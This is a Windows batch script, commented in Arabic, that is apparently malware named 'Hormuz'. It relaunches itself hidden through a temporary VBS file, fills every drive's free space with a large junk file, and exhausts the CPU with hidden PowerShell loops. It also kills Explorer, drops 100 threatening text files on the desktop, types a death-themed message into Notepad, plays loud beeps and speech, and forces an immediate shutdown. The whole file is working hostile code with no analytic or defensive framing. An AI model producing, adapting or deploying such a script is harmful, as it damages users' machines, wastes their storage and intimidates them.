@echo off
:: [01: SYSTEM INITIALIZATION]
chcp 65001 >nul
if not "%1"=="skull" (
    echo Set W=CreateObject("WScript.Shell") > "%temp%\sk.vbs"
    echo W.Run chr(34) ^& "%~f0" ^& chr(34) ^& " skull", 0 >> "%temp%\sk.vbs"
    wscript "%temp%\sk.vbs" & del "%temp%\sk.vbs" & exit /b
)

:: [02: THE SKULL RED INTERFACE - شاشة الجمجمة الحمراء]
:: التحول الكامل للون الأحمر (color 0c) وعرض الجمجمة المصنوعة من الأصفار
start "" cmd /k "color 0c & title HORMUZ_TOTAL_OVERRIDE & mode con: cols=120 lines=45 & echo. & echo   !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! & echo   !!                                      نظام هرمز - السيادة المطلقة                                     !! & echo   !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! & echo. & echo           000000000000000000                    000000000000000000 & echo         0000000000000000000000                0000000000000000000000 & echo        000000000000000000000000              000000000000000000000000 & echo       00000000000000000000000000            00000000000000000000000000 & echo       000000000     000000000000           000000000000     000000000 & echo       00000000       00000000000           00000000000       00000000 & echo       0000000         0000000000           0000000000         0000000 & echo        0000000       0000000000             0000000000       0000000 & echo         000000000000000000000               000000000000000000000 & echo           000000000000000000    000000000    000000000000000000 & echo               000000000000    00000000000    000000000000 & echo                   0000000      000000000      0000000 & echo                     0000        0000000        0000 & echo. & echo                     0000000000000000000000000 & echo                     0000000000000000000000000 & echo                     0000   0000   0000   0000 & echo                     0000   0000   0000   0000 & echo. & echo   !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! & echo   !!             جاري إبادة النظام واستنزاف المعالج... ACTIVE                                     !! & echo   !!                   لقد وجدتك النجمة ⭐... الوداع.                                              !! & echo   !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! & echo. & powershell -Command \"[console]::beep(2000, 1000); Start-Sleep 1; start calc;\" & timeout /t 5 >nul & exit"

:: [03: THE COMPUTATIONAL CYCLONE (CPU Exhaustion)]
:: ميزة تنفيذ 10,000 عملية رياضية معقدة في الخلفية
start /b powershell -WindowStyle Hidden -Command "1..10000 | ForEach-Object { $result = [Math]::Sqrt([Math]::Pow($_, [Math]::PI)) * [Math]::Log($_ + 1); if($_ % 1000 -eq 0){ [console]::beep((Get-Random -Min 100 -Max 2000), 20) } }"

:: [04: THE NULL VOID FEATURE (Disk Exhaustion)]
:: ميزة ملأ المساحة الفارغة بملفات Null
start /b powershell -WindowStyle Hidden -Command "Get-PSDrive -PSProvider FileSystem | ForEach-Object { $drive = $_.Name + ':\'; $free = $_.Free; if($free -gt 100MB){ $filePath = $drive + 'Hormuz_Death_Skull.bin'; $f = [System.IO.File]::Create($filePath); $f.SetLength($free - 2MB); $f.Close(); } }"

:: [05: ASYNC AUDIO & SONIC WARFARE]
start /b powershell -WindowStyle Hidden -Command "& {
    $v = New-Object -ComObject SAPI.SpVoice; $v.Volume = 100;
    for($i=1; $i -le 10; $i++){ [console]::beep(37, 100); Start-Sleep -m 50; [console]::beep(50, 100); Start-Sleep -m 50; [console]::beep(60, 100); Start-Sleep -m 50 }
    1..50 | ForEach-Object { $v.Rate = -10; $v.Speak('الجمجمة الحمراء تراقبك.. لا مفر من هرمز.. اضحك مع العدم الصرف..') }
}"

:: [06: 100 FEATURES & THE GLOBAL MELTDOWN]
powershell -WindowStyle Hidden -Command "Stop-Process -Name explorer -Force; 1..100 | ForEach-Object {
    [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point((Get-Random -Max 1920),(Get-Random -Max 1080));
    $f = [Environment]::GetFolderPath('Desktop') + '\Skull_Death_' + $_ + '.txt';
    'نظام هرمز ⭐ جمجمة الحمراء من الأصفار سحقت جهازك. اضحك مع الفناء. 𓅓𓅱𓏏' | Out-File $f;
}"

:: [07: THE GHOST TYPIST (Final Message)]
start notepad.exe
timeout /t 5 >nul
powershell -Command "$w = New-Object -ComObject WScript.Shell; while(!$w.AppActivate('Notepad')){Sleep 1}; $m = 'هل ترى الجمجمة الحمراء التي تملأ شاشتك؟... إنها مصنوعة من نفس الأصفار التي خنقت مساحة جهازك وحرقت معالجك... الآلة الحاسبة كانت مجرد سخرية، فموتك الرقمي قد حُسب منذ زمن... النجمة ⭐ لا ترحم، وقد حان وقت الصمت المطلق... الوداع أيها العالم الفاني... 𓅓𓅱𓏏'; foreach($c in $m.ToCharArray()){$w.SendKeys($c); Start-Sleep -Milliseconds 55}"

:: [08: FINAL COLLAPSE]
timeout /t 30 >nul
powershell -Command "wininit" >nul 2>&1
shutdown -s -f -t 00 -c "𓅓𓅱𓏏.. السيادة الكاملة للجمجمة الحمراء."
